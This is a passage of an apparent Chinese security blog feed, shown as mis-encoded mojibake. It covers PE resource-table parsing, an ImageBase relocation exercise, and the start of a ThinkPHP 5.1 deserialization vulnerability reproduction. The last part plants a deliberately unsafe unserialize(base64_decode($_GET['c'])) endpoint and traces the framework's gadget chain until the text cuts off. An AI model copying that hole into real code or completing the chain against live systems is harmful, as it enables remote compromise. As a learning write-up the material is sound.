</code>æ¥è§£è¯»</p><p>è¿™é‡Œçš„å‰å››ä¸ªå­—èŠ‚æ˜¯è¡¨ç¤ºèµ„æºç±»å‹ï¼ˆä½¿ç”¨Idå­—æ®µï¼‰ï¼Œåå››ä¸ªå­—èŠ‚è¡¨ç¤ºè¿™ä¸ªèµ„æºç±»å‹çš„åç§»ï¼ˆä½¿ç”¨ç»“æ„ä½“å­—æ®µï¼Œæœ€é«˜ä½è¡¨ç¤ºæ˜¯å¦ä¸ºç›®å½•åç§»ï¼‰ï¼Œä½†è¦æ³¨æ„è¿™é‡Œçš„åç§»æ˜¯ç›¸å¯¹æ•´ä¸ªèµ„æºçš„ï¼Œå³åœ°å€<code>0x67E00</code></p><p>èµ„æºç±»å‹å¯¹åº”å¦‚ä¸‹</p><p><img src="https://img-blog.csdnimg.cn/20190106153858693.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poeXVsbw==,size_16,color_FFFFFF,t_70"></p><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å¯»æ‰¾å‰4ä¸ªå­—èŠ‚ä¸º<code>03</code>çš„å°±å¯ä»¥äº†ï¼Œ</p><p>ä¹Ÿå³åœ°å€<code>0x67E20</code>å¤„ï¼Œåå››å­—èŠ‚çš„ä½31ä½è¡¨ç¤ºåç§»ï¼Œå³<code>0x90</code>ï¼Œè½¬å»<code>0x67E90</code>å¤„</p><h4 id="ç¬¬äºŒå±‚"><a href="#ç¬¬äºŒå±‚" class="headerlink" title="ç¬¬äºŒå±‚"></a>ç¬¬äºŒå±‚</h4><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20101017.png"></p><p>è¿™é‡Œçš„æ’åˆ—ä¸ç¬¬ä¸€å±‚æ˜¯ä¸€æ¨¡ä¸€æ ·çš„ï¼Œçº¢è‰²æ¡†æ˜¯ç»“æ„ä½“<code>IMAGE_RESOURCE_DIRECTORY</code>ï¼Œç»¿è‰²æ¡†æ˜¯ç»“æ„ä½“æ•°ç»„<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>ï¼Œ</p><p>ç›´æ¥åˆ†æç»“æ„ä½“<code>IMAGE_RESOURCE_DIRECTORY_ENTRY</code>ï¼Œ</p><p>å‰å››å­—èŠ‚å¯èƒ½ä½¿ç”¨<code>NameIsStringã€NameOffsetã€Id</code>ï¼Œè¿™å–å†³äºæœ€é«˜ä½ã€‚å¦‚æœNameIsString&#x3D;1ï¼Œè¯´æ˜è¯¥èµ„æºä»¥åç§°(UNICODEç¼–ç çš„å­—ç¬¦ä¸²)å®šä¹‰çš„ï¼ŒNameOffsetæ˜¯åç§°çš„ç›¸å¯¹æ•´ä¸ªèµ„æºç»“æ„çš„åç§»åœ°å€ã€‚ç›¸åï¼Œå¦‚æœNameIsString&#x3D;0ï¼Œè¯´æ˜è¯¥èµ„æºä»¥ID(æ•´å‹æ•°å­—)å®šä¹‰çš„ï¼ŒIDå·ä¸ºIdã€‚æ˜¾ç„¶è¿™é‡Œéƒ½æ˜¯ä»¥IDå¯¼å‡ºçš„ï¼Œå³<code>3,4,5,6,7</code></p><p>åé¢å››å­—èŠ‚ä½¿ç”¨OffsetToDirectoryï¼Œä¸ç¬¬ä¸€å±‚ä¸€æ ·ï¼Œä»£è¡¨äº†ç¬¬ä¸‰å±‚çš„æ•°æ®åç§»åœ°å€ï¼ŒåŒæ ·æ˜¯ç›¸å¯¹æ•´ä¸ªèµ„æºç»“æ„æ¥è¯´çš„ã€‚</p><p>é‚£å°±ç›´æ¥è½¬å»<code>0x67E00+0x1E0=0x67FE0</code>æŸ¥çœ‹</p><h4 id="ç¬¬ä¸‰å±‚"><a href="#ç¬¬ä¸‰å±‚" class="headerlink" title="ç¬¬ä¸‰å±‚"></a>ç¬¬ä¸‰å±‚</h4><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20101613.png"></p><p>ä¸å‰ä¸¤å±‚ä¸€æ ·ï¼Œç¬¬äºŒå±‚èµ·å§‹äºä¸€ä¸ªIMAGE_RESOURCE_DIRECTORYå¤´ï¼Œåé¢ç´§æ¥ç€æ˜¯IMAGE_RESOURCE_DIRECTORY_ENTRYæ•°ç»„ï¼Œä½†ä¸åŒçš„æ˜¯æ•°ç»„ä¸ªæ•°&#x3D;1ã€‚</p><p>IMAGE_RESOURCE_DIRECTORY_ENTRYä½¿ç”¨çš„æ˜¯Nameä¸OffsetToDataï¼Œåˆ†åˆ«ä»£è¡¨äº†èµ„æºè¯­è¨€ç±»å‹ä¸èµ„æºæ•°æ®ç›¸å¯¹åœ°å€ã€‚Nameæ˜¯æŒ‡è¯­è¨€å†…ç ï¼Œè¡¨ç¤ºèµ„æºç±»å‹ä¿¡æ¯ã€‚</p><p>OffsetToDataæ˜¯ç›¸å¯¹æ•´ä¸ªèµ„æºç»“æ„çš„åç§»åœ°å€ï¼ŒæŒ‡å‘ä¸€ä¸ªIMAGE_RESOURCE_DATA_ENTRYç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_RESOURCE_DATA_ENTRY</span> &#123;</span><br>    DWORD   OffsetToData;  <span class="hljs-comment">//èµ„æºæ•°æ®çš„RVA</span><br>    DWORD   Size;          <span class="hljs-comment">//èµ„æºæ•°æ®çš„é•¿åº¦</span><br>    DWORD   CodePage;      <span class="hljs-comment">//ä»£ç é¡µ, ä¸€èˆ¬ä¸º0</span><br>    DWORD   Reserved;      <span class="hljs-comment">//ä¿ç•™å­—æ®µ</span><br>&#125; IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªç»“æ„ä½“æè¿°ä¸€ä¸ªå…·ä½“çš„èµ„æºã€‚é‚£ç°åœ¨å°±è½¬å»<code>0x67E00+0x3D8=0x681D8</code>æŸ¥çœ‹</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20102232.png"></p><p>æ‰€ä»¥è¿™ä¸ªèµ„æºæ•°æ®åç§»RVAæ˜¯<code>0x6C880</code>ï¼Œè½¬æ¢æˆFOAå°±æ˜¯<code>0x68680</code>ï¼Œå¤§å°æ˜¯<code>0x2E8</code>ã€‚</p><p>è‡³æ­¤å°±å¯ä»¥æ‰¾åˆ°æ‰€æœ‰çš„èµ„æºï¼Œå¹¶æ¯”è¾ƒå¤§å°</p><p>è¿™é‡Œä»‹ç»ä¸€ä¸ªå·¥å…·ï¼Œ<code>Resoure hacker</code>ï¼Œå¯ä»¥æ–¹ä¾¿çš„æ‰¾åˆ°æ‰€æœ‰èµ„æºï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±æ¥å†™ä¸€ä¸ªè„šæœ¬æ¥éå†æå–:)</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20102731.png"></p><p>å…¶IDä¹Ÿæ˜¯æˆ‘ä»¬ä¹‹å‰æ‰¾åˆ°çš„<code>3,4,5,6,7</code></p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20102819.png"></p><p>Binaryèµ·å§‹åœ°å€ä¹Ÿæ˜¯æˆ‘ä»¬æ‰¾åˆ°çš„<code>0x68680</code></p><p>è¯´æ˜æˆ‘ä»¬åˆ†ææ­£ç¡®å•¦~</p><p>ç°åœ¨å°±å¯ä»¥æ–¹ä¾¿çš„æå›¾æ ‡äº†~~</p><h3 id="8-å°†hello25-exeç¨‹åºçš„ImageBaseä»00400000Hä¿®æ”¹ä¸º00600000Hï¼Œç„¶åé€šè¿‡å¯¹è¯¥ç¨‹åºå…¶ä»–ä½ç½®è¿›è¡Œç›¸åº”ä¿®æ”¹ï¼Œä½¿å¾—è¯¥ç¨‹åºåŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚"><a href="#8-å°†hello25-exeç¨‹åºçš„ImageBaseä»00400000Hä¿®æ”¹ä¸º00600000Hï¼Œç„¶åé€šè¿‡å¯¹è¯¥ç¨‹åºå…¶ä»–ä½ç½®è¿›è¡Œç›¸åº”ä¿®æ”¹ï¼Œä½¿å¾—è¯¥ç¨‹åºåŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚" class="headerlink" title="8.å°†hello25.exeç¨‹åºçš„ImageBaseä»00400000Hä¿®æ”¹ä¸º00600000Hï¼Œç„¶åé€šè¿‡å¯¹è¯¥ç¨‹åºå…¶ä»–ä½ç½®è¿›è¡Œç›¸åº”ä¿®æ”¹ï¼Œä½¿å¾—è¯¥ç¨‹åºåŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚"></a>8.å°†hello25.exeç¨‹åºçš„ImageBaseä»00400000Hä¿®æ”¹ä¸º00600000Hï¼Œç„¶åé€šè¿‡å¯¹è¯¥ç¨‹åºå…¶ä»–ä½ç½®è¿›è¡Œç›¸åº”ä¿®æ”¹ï¼Œä½¿å¾—è¯¥ç¨‹åºåŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚</h3><p>å¦‚æœä½ åšäº†ç¬¬å…­é¢˜ï¼Œé‚£ä¹ˆè¿™é¢˜å°±å¾ˆå®¹æ˜“ï¼Œå½“ç„¶æ²¡æœ‰åšçš„è¯ï¼Œä¹Ÿæ˜¯å¾ˆå®¹æ˜“çš„</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20103617.png"></p><p>æŠŠæ³¨æ„åŠ›æ”¾åœ¨åœ°å€<code>0x401005,0x40100A,0x40101B,0x401020</code>ä»¥åŠæœ€ä¸‹é¢çš„ä¸‰ä¸ª<code>jmp</code>æŒ‡ä»¤ï¼Œä½ ä¼šå‘ç°ä»–ä»¬çš„æ“ä½œç éƒ½æ˜¯åœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€æ˜¯ç”±<code>ImageBase+RVA</code>å†³å®šçš„ï¼Œå¦‚æœæˆ‘ä»¬æ”¹å˜äº†<code>ImageBase</code>ï¼Œé‚£ä¹ˆè¿™ä¸ªåœ°å€å°±ä¼šå—åˆ°å½±å“ï¼Œæˆ‘ä»¬å°±éœ€è¦å»ä¿®å¤è¿™äº›åœ°å€ã€‚</p><p>å®é™…ä¸Šé‡å®šä½è¡¨è®°å½•çš„å°±æ˜¯è¿™äº›éœ€è¦ä¿®æ­£çš„åœ°å€ï¼Œæ“ä½œç³»ç»Ÿå°±æ£€æŸ¥æ˜¯å¦æŒ‰ç…§é¢„è®¡çš„<code>ImageBase</code>åŠ è½½ï¼Œå¦‚æœä¸æ˜¯å°±æŸ¥é‡å®šä½è¡¨ä¸€é¡¹ä¸€é¡¹çš„å»ä¿®ã€‚æˆ‘ä»¬ç°åœ¨è¦åšçš„ï¼Œå°±æ˜¯è¿™ä¸ªå·¥ä½œã€‚</p><p>ä½†æ˜¯å¦‚æœä½ ä½¿ç”¨PEæŸ¥çœ‹å™¨å»æ‰¾è¿™ä¸ªexeçš„é‡å®šä½è¡¨ï¼Œä½ ä¼šå‘ç°æ‰¾ä¸åˆ°ï¼Œå› ä¸ºå®ƒæ ¹æœ¬å°±æ²¡æœ‰ã€‚</p><p>å…¶åŸå› æ˜¯exeçš„<code>ImageBase</code>æ˜¯æ¯”è¾ƒå°çš„ï¼Œä¸”å®ƒæ˜¯ä¼˜å…ˆè£…è½½ï¼Œç»å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½ä¼šæŒ‰ç…§é¢„è®¡çš„<code>ImageBase</code>è£…è½½ï¼Œåªæœ‰æå°‘æƒ…å†µä¸‹ä¼šæ”¹å˜ï¼Œæ¯”å¦‚æˆ‘ä»¬æ‰‹åŠ¨å»æ”¹ã€‚</p><p>ä½†æ˜¯é‡å®šä½è¡¨å¯¹äºDLLæ¥è¯´æ˜¯ååˆ†é‡è¦çš„ï¼Œå› ä¸ºä¸€ä¸ªexeå¯èƒ½ä½¿ç”¨å¾ˆå¤šçš„DLLï¼Œè€ŒDLLå…¨éƒ¨éƒ½å¤„äºé«˜2Gï¼Œé‚£å°±å¾ˆå®¹æ˜“å‘ç”Ÿå†²çªï¼Œå°±ä¸èƒ½è£…è½½åˆ°é¢„å®šä½ç½®ï¼Œäºæ˜¯ä¼šè¢«è£…è½½åˆ°å…¶ä»–åœ°æ–¹ï¼Œæ­¤æ—¶å°±éœ€è¦é‡å®šä½è¡¨æ¥ä¿®å¤ã€‚</p><p>é‚£ä¹ˆè¿™é‡Œæ²¡æœ‰é‡å®šä½è¡¨å’‹æ•´ï¼Ÿ</p><p>æ²¡æœ‰å°±æ²¡æœ‰å§ï¼Œåæ­£è¿™ä¸ªç¨‹åºä¹Ÿç®€å•ï¼Œéœ€è¦ä¿®æ”¹çš„åœ°å€ä¹Ÿå°±æ˜¯æˆ‘åˆ—å‡ºæ¥çš„é‚£å‡ ä¸ªï¼ŒæŠŠä»–ä»¬çš„æ“ä½œç å…¨éƒ¨åŠ ä¸Š<code>0x200000</code>å°±å¯ä»¥äº†ï¼Œä¹Ÿå°±æ˜¯æ”¹æˆ<code>0x6xxxxx</code>å½¢å¼</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20104831.png"></p><p>ç„¶åå†åˆ©ç”¨PEå·¥å…·ä¿®æ”¹<code>ImageBase</code>å°±å¯ä»¥å•¦</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20104950.png"></p><p>å†ç”¨32dbgæ‰“å¼€éªŒè¯</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-10-21%20105100.png"></p><p>æˆåŠŸ~</p>]]></content>
    
    
    <categories>
      
      <category>SYSU</category>
      
      <category>Software</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP_5.1.* ååºåˆ—åŒ–å¤ç°</title>
    <link href="/2023/10/08/ThinkPHP/"/>
    <url>/2023/10/08/ThinkPHP/</url>
    
    <content type="html"><![CDATA[<p>ThinkPHP 5.1.* ååºåˆ—åŒ–æ¼æ´å¤ç°</p><span id="more"></span><h2 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h2><p>ä½¿ç”¨å‘½ä»¤<code>composer create-project topthink/think tp5.1 &quot;5.1.*&quot;</code>åˆ›å»ºä¸€ä¸ªåä¸º<code>tp5.1</code>çš„é¡¹ç›®ï¼Œç‰ˆæœ¬ä¸º<code>5.1.*</code></p><p>è¿›å…¥<code>tp5.1</code>ï¼Œä½¿ç”¨å‘½ä»¤<code>php think run</code>å¯åŠ¨</p><p>åœ¨<code>tp5.1/application/index/controller/Index.php</code>åˆ›å»ºå¤„ç†å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12è½½åˆå¿ƒä¸æ”¹ï¼ˆ2006-2018ï¼‰ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;ThinkPHP5&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello,&#x27;</span> . <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">demo</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>            <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>            <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$code</span>));<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        &#125;<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿›å…¥<code>tp5.1/route/route.php</code>åˆ›å»ºè·¯ç”±</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;demo&#x27;</span>, <span class="hljs-string">&#x27;index/demo&#x27;</span>);<br><br></code></pre></td></tr></table></figure><p>è®¿é—®<code>http://myhost.local/ThinkPHP/tp5.1/public/demo</code>å³å¯</p><h2 id="ååºåˆ—åŒ–é“¾åˆ†æ"><a href="#ååºåˆ—åŒ–é“¾åˆ†æ" class="headerlink" title="ååºåˆ—åŒ–é“¾åˆ†æ"></a>ååºåˆ—åŒ–é“¾åˆ†æ</h2><p>ThinkPHP_5.1çš„æ¼æ´å…¥å£åœ¨<code>think\process\pipes\windows</code>çš„<code>__destruct()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">removeFiles</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>$this-&gt;close()</code>æ— æ³•åˆ©ç”¨ï¼Œèƒ½å¤Ÿåˆ©ç”¨çš„æ˜¯<code>$this-&gt;removeFiles()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">removeFiles</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$filename</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable language_">$this</span>-&gt;files = [];<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨<code>removeFiles()</code>é‡Œé¢ä½¿ç”¨äº†<code>file_exists()</code>å‡½æ•°ï¼Œè¿™é‡Œä¼šæŠŠ<code>$filename</code>å½“åšä¸€ä¸ªå­—ç¬¦ä¸²æ¥å¤„ç†ï¼Œè€Œ<code>$this-&gt;files</code>åˆå¯æ§ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»»ä½•ä¸€ä¸ªå®ç°äº†<code>__toString()</code>çš„ç±»ï¼Œæœ€ç»ˆé€‰æ‹©ä½¿ç”¨<code> think\model\concern</code>çš„<code>trait Conversion</code>ï¼Œæ³¨æ„è¿™é‡Œæ˜¯<code>trait</code>ï¼Œæ— æ³•å®ä¾‹åŒ–ï¼Œéœ€è¦æ‰¾ä¸€ä¸ªå®ç°æ­¤<code>trait</code>çš„ç±»æ‰å¯ä»¥å®ä¾‹åŒ–ï¼Œè¿™åé¢ä¼šæåˆ°ã€‚</p><p>å…ˆæ¥çœ‹<code>__toString()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">toJson</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›<code>toJson()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toJson</span>(<span class="hljs-params"><span class="hljs-variable">$options</span> = JSON_UNESCAPED_UNICODE</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">toArray</span>(), <span class="hljs-variable">$options</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»§ç»­è·Ÿè¿›<code>toArray()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">toArray</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$item</span>       = [];<br>        <span class="hljs-variable">$hasVisible</span> = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;visible <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$val</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$val</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$relation</span>, <span class="hljs-variable">$name</span>)      = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$val</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;visible[<span class="hljs-variable">$relation</span>][] = <span class="hljs-variable">$name</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;visible[<span class="hljs-variable">$val</span>] = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$hasVisible</span>          = <span class="hljs-literal">true</span>;<br>                &#125;<br>                <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;visible[<span class="hljs-variable">$key</span>]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;hidden <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$val</span>)) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$val</span>, <span class="hljs-string">&#x27;.&#x27;</span>)) &#123;<br>                    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$relation</span>, <span class="hljs-variable">$name</span>)     = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$val</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;hidden[<span class="hljs-variable">$relation</span>][] = <span 